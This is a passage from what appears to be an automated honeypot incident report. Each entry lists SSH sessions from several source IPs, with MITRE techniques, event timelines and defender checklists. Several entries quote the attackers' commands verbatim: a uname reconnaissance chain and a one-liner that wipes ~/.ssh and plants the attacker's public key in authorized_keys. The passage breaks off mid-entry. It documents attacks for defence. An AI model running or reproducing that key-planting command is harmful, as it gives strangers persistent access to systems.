| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:08:07` | `cowrie.session.connect` |
| `2026-07-24 03:08:07` | `cowrie.client.version` |
| `2026-07-24 03:08:07` | `cowrie.client.kex` |
| `2026-07-24 03:08:10` | `cowrie.login.success` |
| `2026-07-24 03:08:11` | `cowrie.session.params` |
| `2026-07-24 03:08:11` | `cowrie.command.input` |
| `2026-07-24 03:08:11` | `cowrie.command.input` |
| `2026-07-24 03:08:11` | `cowrie.command.input` |
| `2026-07-24 03:08:11` | `cowrie.command.input` |
| `2026-07-24 03:08:11` | `cowrie.command.input` |
| `2026-07-24 03:08:11` | `cowrie.command.success` |
| `2026-07-24 03:08:11` | `cowrie.command.input` |
| `2026-07-24 03:08:11` | `cowrie.command.input` |
| `2026-07-24 03:08:11` | `cowrie.command.input` |
| `2026-07-24 03:08:11` | `cowrie.command.input` |
| `2026-07-24 03:08:12` | `cowrie.log.closed` |
| `2026-07-24 03:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1d17c5a6dbf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:10 |
| **Last Seen** | 2026-07-24 03:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:10:13` | `cowrie.session.connect` |
| `2026-07-24 03:10:13` | `cowrie.client.version` |
| `2026-07-24 03:10:13` | `cowrie.client.kex` |
| `2026-07-24 03:10:15` | `cowrie.login.success` |
| `2026-07-24 03:10:16` | `cowrie.session.params` |
| `2026-07-24 03:10:16` | `cowrie.command.input` |
| `2026-07-24 03:10:16` | `cowrie.command.input` |
| `2026-07-24 03:10:16` | `cowrie.command.input` |
| `2026-07-24 03:10:16` | `cowrie.command.input` |
| `2026-07-24 03:10:16` | `cowrie.command.input` |
| `2026-07-24 03:10:16` | `cowrie.command.success` |
| `2026-07-24 03:10:16` | `cowrie.command.input` |
| `2026-07-24 03:10:16` | `cowrie.command.input` |
| `2026-07-24 03:10:16` | `cowrie.command.input` |
| `2026-07-24 03:10:16` | `cowrie.command.input` |
| `2026-07-24 03:10:16` | `cowrie.log.closed` |
| `2026-07-24 03:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c0b971af832

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:12 |
| **Last Seen** | 2026-07-24 03:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:12:19` | `cowrie.session.connect` |
| `2026-07-24 03:12:19` | `cowrie.client.version` |
| `2026-07-24 03:12:19` | `cowrie.client.kex` |
| `2026-07-24 03:12:21` | `cowrie.login.success` |
| `2026-07-24 03:12:22` | `cowrie.session.params` |
| `2026-07-24 03:12:22` | `cowrie.command.input` |
| `2026-07-24 03:12:22` | `cowrie.command.input` |
| `2026-07-24 03:12:22` | `cowrie.command.input` |
| `2026-07-24 03:12:22` | `cowrie.command.input` |
| `2026-07-24 03:12:22` | `cowrie.command.input` |
| `2026-07-24 03:12:22` | `cowrie.command.success` |
| `2026-07-24 03:12:22` | `cowrie.command.input` |
| `2026-07-24 03:12:22` | `cowrie.command.input` |
| `2026-07-24 03:12:22` | `cowrie.command.input` |
| `2026-07-24 03:12:22` | `cowrie.command.input` |
| `2026-07-24 03:12:23` | `cowrie.log.closed` |
| `2026-07-24 03:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7432ad9454a7

| Field | Detail |
|---|---|
| **Source IP** | `113.193.187[.]154` |
| **First Seen** | 2026-07-24 03:12 |
| **Last Seen** | 2026-07-24 03:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:12:30` | `cowrie.session.connect` |
| `2026-07-24 03:12:31` | `cowrie.client.version` |
| `2026-07-24 03:12:31` | `cowrie.client.kex` |
| `2026-07-24 03:12:32` | `cowrie.login.success` |
| `2026-07-24 03:12:33` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.187[.]154` to AbuseIPDB if not already reported
- [ ] Block `113.193.187[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28b764da8ecd

| Field | Detail |
|---|---|
| **Source IP** | `24.122.136[.]94` |
| **First Seen** | 2026-07-24 03:14 |
| **Last Seen** | 2026-07-24 03:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:14:15` | `cowrie.session.connect` |
| `2026-07-24 03:14:15` | `cowrie.client.version` |
| `2026-07-24 03:14:15` | `cowrie.client.kex` |
| `2026-07-24 03:14:16` | `cowrie.login.success` |
| `2026-07-24 03:14:16` | `cowrie.session.params` |
| `2026-07-24 03:14:16` | `cowrie.command.input` |
| `2026-07-24 03:14:16` | `cowrie.command.failed` |
| `2026-07-24 03:14:16` | `cowrie.log.closed` |
| `2026-07-24 03:14:17` | `cowrie.session.params` |
| `2026-07-24 03:14:17` | `cowrie.command.input` |
| `2026-07-24 03:14:17` | `cowrie.session.file_download` |
| `2026-07-24 03:14:17` | `cowrie.log.closed` |
| `2026-07-24 03:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.122.136[.]94` to AbuseIPDB if not already reported
- [ ] Block `24.122.136[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fdf30134826

| Field | Detail |
|---|---|
| **Source IP** | `24.122.136[.]94` |
| **First Seen** | 2026-07-24 03:14 |
| **Last Seen** | 2026-07-24 03:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:14:17` | `cowrie.session.connect` |
| `2026-07-24 03:14:17` | `cowrie.client.version` |
| `2026-07-24 03:14:17` | `cowrie.client.kex` |
| `2026-07-24 03:14:17` | `cowrie.login.success` |
| `2026-07-24 03:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.122.136[.]94` to AbuseIPDB if not already reported
- [ ] Block `24.122.136[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705cd3a09964

| Field | Detail |
|---|---|
| **Source IP** | `24.122.136[.]94` |
| **First Seen** | 2026-07-24 03:14 |
| **Last Seen** | 2026-07-24 03:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:14:17` | `cowrie.session.connect` |
| `2026-07-24 03:14:17` | `cowrie.client.version` |
| `2026-07-24 03:14:17` | `cowrie.client.kex` |
| `2026-07-24 03:14:17` | `cowrie.login.success` |
| `2026-07-24 03:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.122.136[.]94` to AbuseIPDB if not already reported
- [ ] Block `24.122.136[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-479b44fd8445

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:14 |
| **Last Seen** | 2026-07-24 03:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:14:24` | `cowrie.session.connect` |
| `2026-07-24 03:14:25` | `cowrie.client.version` |
| `2026-07-24 03:14:25` | `cowrie.client.kex` |
| `2026-07-24 03:14:26` | `cowrie.login.success` |
| `2026-07-24 03:14:28` | `cowrie.session.params` |
| `2026-07-24 03:14:28` | `cowrie.command.input` |
| `2026-07-24 03:14:28` | `cowrie.command.input` |
| `2026-07-24 03:14:28` | `cowrie.command.input` |
| `2026-07-24 03:14:28` | `cowrie.command.input` |
| `2026-07-24 03:14:28` | `cowrie.command.input` |
| `2026-07-24 03:14:28` | `cowrie.command.success` |
| `2026-07-24 03:14:28` | `cowrie.command.input` |
| `2026-07-24 03:14:28` | `cowrie.command.input` |
| `2026-07-24 03:14:28` | `cowrie.command.input` |
| `2026-07-24 03:14:28` | `cowrie.command.input` |
| `2026-07-24 03:14:28` | `cowrie.log.closed` |
| `2026-07-24 03:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5815611bf978

| Field | Detail |
|---|---|
| **Source IP** | `101.32.145[.]199` |
| **First Seen** | 2026-07-24 03:16 |
| **Last Seen** | 2026-07-24 03:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:16:40` | `cowrie.session.connect` |
| `2026-07-24 03:16:40` | `cowrie.client.version` |
| `2026-07-24 03:16:40` | `cowrie.client.kex` |
| `2026-07-24 03:16:41` | `cowrie.login.success` |
| `2026-07-24 03:16:42` | `cowrie.session.params` |
| `2026-07-24 03:16:42` | `cowrie.command.input` |
| `2026-07-24 03:16:42` | `cowrie.command.failed` |
| `2026-07-24 03:16:43` | `cowrie.log.closed` |
| `2026-07-24 03:16:43` | `cowrie.session.params` |
| `2026-07-24 03:16:43` | `cowrie.command.input` |
| `2026-07-24 03:16:44` | `cowrie.session.file_download` |
| `2026-07-24 03:16:44` | `cowrie.log.closed` |
| `2026-07-24 03:16:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.145[.]199` to AbuseIPDB if not already reported
- [ ] Block `101.32.145[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbd1578ec3c7

| Field | Detail |
|---|---|
| **Source IP** | `101.32.145[.]199` |
| **First Seen** | 2026-07-24 03:16 |
| **Last Seen** | 2026-07-24 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:16:44` | `cowrie.session.connect` |
| `2026-07-24 03:16:44` | `cowrie.client.version` |
| `2026-07-24 03:16:44` | `cowrie.client.kex` |
| `2026-07-24 03:16:45` | `cowrie.login.success` |
| `2026-07-24 03:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.145[.]199` to AbuseIPDB if not already reported
- [ ] Block `101.32.145[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f92d2d0d1a40

| Field | Detail |
|---|---|
| **Source IP** | `101.32.145[.]199` |
| **First Seen** | 2026-07-24 03:16 |
| **Last Seen** | 2026-07-24 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:16:46` | `cowrie.session.connect` |
| `2026-07-24 03:16:46` | `cowrie.client.version` |
| `2026-07-24 03:16:46` | `cowrie.client.kex` |
| `2026-07-24 03:16:47` | `cowrie.login.success` |
| `2026-07-24 03:16:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.145[.]199` to AbuseIPDB if not already reported
- [ ] Block `101.32.145[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a1b10906e4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:18 |
| **Last Seen** | 2026-07-24 03:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:18:22` | `cowrie.session.connect` |
| `2026-07-24 03:18:22` | `cowrie.client.version` |
| `2026-07-24 03:18:22` | `cowrie.client.kex` |
| `2026-07-24 03:18:24` | `cowrie.login.success` |
| `2026-07-24 03:18:25` | `cowrie.session.params` |
| `2026-07-24 03:18:25` | `cowrie.command.input` |
| `2026-07-24 03:18:25` | `cowrie.command.input` |
| `2026-07-24 03:18:25` | `cowrie.command.input` |
| `2026-07-24 03:18:25` | `cowrie.command.input` |
| `2026-07-24 03:18:25` | `cowrie.command.input` |
| `2026-07-24 03:18:25` | `cowrie.command.success` |
| `2026-07-24 03:18:25` | `cowrie.command.input` |
| `2026-07-24 03:18:25` | `cowrie.command.input` |
| `2026-07-24 03:18:25` | `cowrie.command.input` |
| `2026-07-24 03:18:25` | `cowrie.command.input` |
| `2026-07-24 03:18:26` | `cowrie.log.closed` |
| `2026-07-24 03:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0630da07b62d

| Field | Detail |
|---|---|
| **Source IP** | `103.121.27[.]218` |
| **First Seen** | 2026-07-24 03:18 |
| **Last Seen** | 2026-07-24 03:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:18:53` | `cowrie.session.connect` |
| `2026-07-24 03:18:53` | `cowrie.client.version` |
| `2026-07-24 03:18:53` | `cowrie.client.kex` |
| `2026-07-24 03:18:55` | `cowrie.login.success` |
| `2026-07-24 03:18:55` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.121.27[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.121.27[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de73f8ce880c

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-24 03:19 |
| **Last Seen** | 2026-07-24 03:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:19:00` | `cowrie.session.connect` |
| `2026-07-24 03:19:01` | `cowrie.client.version` |
| `2026-07-24 03:19:01` | `cowrie.client.kex` |
| `2026-07-24 03:19:02` | `cowrie.login.success` |
| `2026-07-24 03:19:02` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:19:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899b66656e17

| Field | Detail |
|---|---|
| **Source IP** | `196.189.59[.]226` |
| **First Seen** | 2026-07-24 03:19 |
| **Last Seen** | 2026-07-24 03:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:19:00` | `cowrie.session.connect` |
| `2026-07-24 03:19:02` | `cowrie.client.version` |
| `2026-07-24 03:19:02` | `cowrie.client.kex` |
| `2026-07-24 03:19:04` | `cowrie.login.success` |
| `2026-07-24 03:19:04` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.59[.]226` to AbuseIPDB if not already reported
- [ ] Block `196.189.59[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e1ef034e9c

| Field | Detail |
|---|---|
| **Source IP** | `58.56.128[.]190` |
| **First Seen** | 2026-07-24 03:19 |
| **Last Seen** | 2026-07-24 03:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:19:12` | `cowrie.session.connect` |
| `2026-07-24 03:19:13` | `cowrie.client.version` |
| `2026-07-24 03:19:13` | `cowrie.client.kex` |
| `2026-07-24 03:19:15` | `cowrie.login.success` |
| `2026-07-24 03:19:15` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.56.128[.]190` to AbuseIPDB if not already reported
- [ ] Block `58.56.128[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc8bcda731ae

| Field | Detail |
|---|---|
| **Source IP** | `77.105.130[.]18` |
| **First Seen** | 2026-07-24 03:19 |
| **Last Seen** | 2026-07-24 03:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:19:56` | `cowrie.session.connect` |
| `2026-07-24 03:19:56` | `cowrie.client.version` |
| `2026-07-24 03:19:56` | `cowrie.client.kex` |
| `2026-07-24 03:19:57` | `cowrie.login.success` |
| `2026-07-24 03:19:57` | `cowrie.session.params` |
| `2026-07-24 03:19:57` | `cowrie.command.input` |
| `2026-07-24 03:19:57` | `cowrie.command.failed` |
| `2026-07-24 03:19:58` | `cowrie.log.closed` |
| `2026-07-24 03:19:58` | `cowrie.session.params` |
| `2026-07-24 03:19:58` | `cowrie.command.input` |
| `2026-07-24 03:19:58` | `cowrie.session.file_download` |
| `2026-07-24 03:19:58` | `cowrie.log.closed` |
| `2026-07-24 03:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.105.130[.]18` to AbuseIPDB if not already reported
- [ ] Block `77.105.130[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0131f08c79b

| Field | Detail |
|---|---|
| **Source IP** | `77.105.130[.]18` |
| **First Seen** | 2026-07-24 03:19 |
| **Last Seen** | 2026-07-24 03:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:19:58` | `cowrie.session.connect` |
| `2026-07-24 03:19:58` | `cowrie.client.version` |
| `2026-07-24 03:19:59` | `cowrie.client.kex` |
| `2026-07-24 03:19:59` | `cowrie.login.success` |
